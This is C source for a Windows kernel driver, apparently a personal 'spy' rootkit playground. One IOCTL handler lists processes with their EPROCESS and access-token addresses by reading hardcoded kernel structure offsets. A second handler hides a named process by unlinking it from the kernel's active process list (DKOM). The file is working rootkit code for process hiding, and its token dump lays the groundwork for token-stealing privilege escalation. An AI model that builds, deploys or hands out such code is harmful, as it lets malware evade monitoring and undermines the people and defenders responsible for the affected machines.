#pragma once
#include "prototypes.h"
#include "common.h"

// ---------------------------------------------------------------
// IOCTL codes handler for Processes playground
// ---------------------------------------------------------------

// List running processes IOCTL handler
NTSTATUS SpyIoEnumerateRunningProcess(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] SpyIoEnumerateRunningProcess called\n");

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    ULONG count = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;

    // Header
    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "[*] Listing Running Processes:\n\n");
    if (!NT_SUCCESS(status)) {
        *bytesReturned = 0;
        return status;
    }
    RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    offset += (ULONG)writtenBytes;

    // Check if PsInitialSystemProcess is available
    if (!PsInitialSystemProcess) {
        DbgPrint("[-] PsInitialSystemProcess is NULL\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

    PEPROCESS CurrentProcess = PsInitialSystemProcess;
    DbgPrint("[*] Starting from PsInitialSystemProcess: 0x%p\n", CurrentProcess);

    // handle System process first
    HANDLE systemPid = PsGetProcessId(CurrentProcess);
    PCHAR SystemImage = PsGetProcessImageFileName(CurrentProcess);
    if (!SystemImage || systemPid == 0)  DbgPrint("[!] Failed to get System process info\n");
    else
    {
        // adding token enumeration in my VM Token offset is 0x4B8
        UINT64 rawToken = *(UINT64*)((PUCHAR)CurrentProcess + 0x4B8);
        UINT64 token = rawToken & ~0xF;

        DbgPrint("[%03lu] PID: %u -> %s (0x%p)\n",
            count, (ULONG)(ULONG_PTR)systemPid, SystemImage, CurrentProcess);
        status = RtlStringCbPrintfA(out + offset, outputLength - offset,
            "[%03lu] PID: %-6u | Name: %-20s | EPROCESS: 0x%p | TOKEN: 0x%llx\n",
            count,
            (ULONG)(ULONG_PTR)systemPid,
            SystemImage,
            CurrentProcess,
            token);
        if (NT_SUCCESS(status)) {
            RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            offset += (ULONG)writtenBytes;
        }
        count++;
    }

    // ActiveProcessLinks offset in Windows server 2022 +0x448
    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)CurrentProcess + 0x448);
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {

        // reverse the offset: LIST_ENTRY → EPROCESS
        PEPROCESS currentProcess = (PEPROCESS)((ULONG_PTR)entry - 0x448);

        HANDLE pid = PsGetProcessId(currentProcess);
        PCHAR imageName = PsGetProcessImageFileName(currentProcess);

        if (!imageName || pid == 0) {
            entry = entry->Flink;
            continue; // skip this entry
        }

        DbgPrint("[%03lu] PID: %u -> %s (0x%p)\n",
            count, (ULONG)(ULONG_PTR)pid, imageName, currentProcess);

        // Same Token Part
        UINT64 rawToken = *(UINT64*)((PUCHAR)currentProcess + 0x4B8);
        UINT64 token = rawToken & ~0xF;

        // Write to output buffer
        status = RtlStringCbPrintfA(out + offset, outputLength - offset,
            "[%03lu] PID: %-6u | Name: %-20s | EPROCESS: 0x%p | TOKEN: 0x%llx\n",
            count,
            (ULONG)(ULONG_PTR)pid,
            imageName,
            currentProcess,
            token);

        if (!NT_SUCCESS(status)) break;

        RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        offset += (ULONG)writtenBytes;

        count++;

        // Check buffer space
        if (offset >= outputLength - 200) {
            DbgPrint("[!] Buffer limit reached\n");
            break;
        }

        entry = entry->Flink;

        if (count > 1000) {
            DbgPrint("[!] Too many processes, breaking\n");
            break;
        }
    }

    status = RtlStringCbPrintfA(out + offset, outputLength - offset,
        "\nTotal processes: %lu\n", count);
    if (NT_SUCCESS(status)) {
        RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
    DbgPrint("[+] SpyIoEnumerateRunningProcess finished (%lu processes, %lu bytes)\n",
        count, offset);

    return STATUS_SUCCESS;
}

// Hide process IOCTL handler
NTSTATUS SpyIoHideProcess(
    PVOID outputBuffer,
    ULONG outputLength,
    PULONG_PTR bytesReturned
)
{
    DbgPrint("[*] SpyIoHideProcess called\n");
    if (!PsInitialSystemProcess) {
        DbgPrint("[-] PsInitialSystemProcess is NULL\n");
        *bytesReturned = 0;
        return STATUS_UNSUCCESSFUL;
    }

    // get target process name
    PSPY_HIDE_INPUT input = (PSPY_HIDE_INPUT)outputBuffer;
    char targetProc[256] = { 0 };
    RtlCopyMemory(targetProc, input->g_Name, sizeof(input->g_Name));
    DbgPrint("[*] Looking for process: %s\n", targetProc);

    char* out = (char*)outputBuffer;
    ULONG offset = 0;
    NTSTATUS status;
    size_t writtenBytes = 0;
    BOOLEAN found = FALSE;

    status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Hiding Process: %s\n\n", targetProc);
    if (!NT_SUCCESS(status)) {
        DbgPrint("[-] Header print failed: 0x%X\n", status);
        *bytesReturned = 0;
        return status;
    }

    status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
    if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
    offset += (ULONG)writtenBytes;

    // search in active process list
    PEPROCESS CurrentProcess = PsInitialSystemProcess;

    // ActiveProcessLinks offset in Windows server 2022 +0x448
    PLIST_ENTRY head = (PLIST_ENTRY)((ULONG_PTR)CurrentProcess + 0x448);
    PLIST_ENTRY current = head->Flink;
    while (current != head) {
        // reverse the offset: LIST_ENTRY → EPROCESS
        PEPROCESS process = (PEPROCESS)((ULONG_PTR)current - 0x448);
        PCHAR imageName = PsGetProcessImageFileName(process);
        /* if (imageName && RtlCompareMemory(imageName, targetProc, strlen(targetProc)) == strlen(targetProc))*/
        ANSI_STRING procName;
        ANSI_STRING targetName;
        RtlInitAnsiString(&procName, imageName);
        RtlInitAnsiString(&targetName, targetProc);
        if (RtlEqualString(&procName, &targetName, TRUE))
        {
            DbgPrint("[+] Found target process: %s -> 0x%p\n", imageName, process);

            found = TRUE;

            PLIST_ENTRY prev = current->Blink;
            PLIST_ENTRY next = current->Flink;

            DbgPrint("[*] Unlinking process...\n");
            DbgPrint("    Prev: 0x%p\n", prev);
            DbgPrint("    Current: 0x%p\n", current);
            DbgPrint("    Next: 0x%p\n", next);

            // append to output
            status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[*] Unlinking process...\n    Prev: 0x%p\n    Current: 0x%p\n    Next: 0x%p\n", prev, current, next);
            if (!NT_SUCCESS(status)) {
                DbgPrint("[!] Unlinking print failed: 0x%X\n", status);
                *bytesReturned = 0;
                return status;
            }
            status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
            offset += (ULONG)writtenBytes;
            // Unlink from the list
            prev->Flink = next;
            next->Blink = prev;
            DbgPrint("[+] Process unlinked successfully\n");

            // cleanup
            current->Flink = current;
            current->Blink = current;

            // append to output success message
            status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[+] Process unlinked successfully\n");
            if (!NT_SUCCESS(status)) {
                DbgPrint("[!] Success print failed: 0x%X\n", status);
                *bytesReturned = 0;
                return status;
            }
            status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
            if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
            offset += (ULONG)writtenBytes;
            break;

        }

        current = current->Flink;
    }

    if (!found) {
        DbgPrint("[-] Target process not found: %s\n", targetProc);
        status = RtlStringCbPrintfA(out + offset, outputLength - offset, "[-] Target process not found: %s\n", targetProc);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[!] Not Found print failed: 0x%X\n", status);
            *bytesReturned = 0;
            return status;
        }
        status = RtlStringCbLengthA(out + offset, outputLength - offset, &writtenBytes);
        if (!NT_SUCCESS(status)) { *bytesReturned = 0; return status; }
        offset += (ULONG)writtenBytes;
    }

    *bytesReturned = offset;
    return STATUS_SUCCESS;
}